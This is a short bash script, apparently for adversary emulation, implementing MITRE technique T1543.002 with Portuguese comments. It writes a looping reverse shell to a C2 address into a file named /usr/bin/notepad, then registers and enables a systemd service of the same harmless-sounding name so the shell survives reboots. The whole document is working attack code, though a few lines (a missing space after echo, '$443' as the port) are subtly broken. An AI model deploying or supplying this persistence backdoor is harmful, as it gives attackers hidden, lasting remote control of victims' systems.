#!/bin/bash

# T1543.002 - Create or Modify System Process: Systemd Service
systemd_create_service(){ 
# Criando serviço para estabelecer a comunicação shell reversa com IP da C2
echo"
#!/bin/bash
    while true; do
        sh -i >& /dev/tcp/$c2_ip/$443 0>&1
        sleep 1  # Espera um pouco antes de tentar novamente em caso de falha
    done
" > /usr/bin/notepad   

# Adicionando como serviço no systemd e habilitando persistencia da comunicação mesmo após o restart 
echo"
[Unit]
Description=Serviço notepad
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/notepad
Restart=always

[Install]
WantedBy=multi-user.target
" > /etc/systemd/system/notepad.service
    sudo systemctl daemon-reload
    sudo systemctl enable notepad.service
    sudo systemctl start notepad.service
}
